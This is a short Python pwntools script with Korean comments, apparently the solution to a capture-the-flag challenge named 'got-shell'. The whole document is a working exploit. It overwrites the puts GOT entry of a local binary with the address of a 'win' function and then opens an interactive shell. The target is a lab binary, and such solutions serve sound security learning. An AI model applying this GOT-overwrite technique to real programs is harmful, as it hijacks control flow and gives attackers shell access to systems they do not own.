#! -*- coding:utf-8 -*-

from pwn import * 
p = process("./got-shell")

# 쓸 주소 위치와, 어떤 값을 쓸지를 입력받는다. 
# pie 안걸려있는 라이브러리고, 주소 교체 이후에 실행되는 함수는 puts 함수.
# scanf 입력받을때 %x 서식문자로 입력받는거 주의. 

puts_got = 0x804a00c
win = 0x0804854b

log.info("addr : "+hex(puts_got)[2:])
p.sendlineafter("value?",hex(puts_got)[2:])
p.sendlineafter("write to ",hex(win)[2:])

p.interactive()
